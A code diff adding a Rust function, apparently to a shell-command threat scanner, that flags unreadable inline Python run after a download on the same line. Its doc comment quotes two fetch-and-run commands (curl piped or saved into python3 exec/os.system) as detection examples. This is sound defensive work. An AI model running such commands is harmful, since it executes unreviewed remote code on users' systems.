@@ -2786,6 +2786,25 @@ pub(crate) fn inline_code_reading(source: &str) -> InlineReading {
     reading
 }
 
+/// Whether inline code that runs a line or code it cannot read
+/// ([`InlineReading::unread`], [`InlineReading::code_unread`]) runs after
+/// a command of the same line that downloads: `curl -o p.py URL && python3
+/// -c "exec(open('p.py').read())"`, `curl URL | python3 -c "import os,sys;
+/// os.system(sys.stdin.read())"`. What it cannot read may be the download.
+pub(crate) fn inline_unread_after_download(source: &str) -> bool {
+    let mut downloaded = false;
+    for segment in crate::threats::shell_command_segments(source) {
+        if downloaded {
+            let reading = inline_code_reading(segment);
+            if reading.unread || reading.code_unread {
+                return true;
+            }
+        }
+        downloaded |= inline_calls::line_downloads(segment);
+    }
+    false
+}
+
 /// A double-quoted shell word's text as the shell hands it on: the
 /// backslash taken off `$`, a backtick, `"`, `\\` and a line end.
 fn double_quote_unescaped(text: &str) -> String {
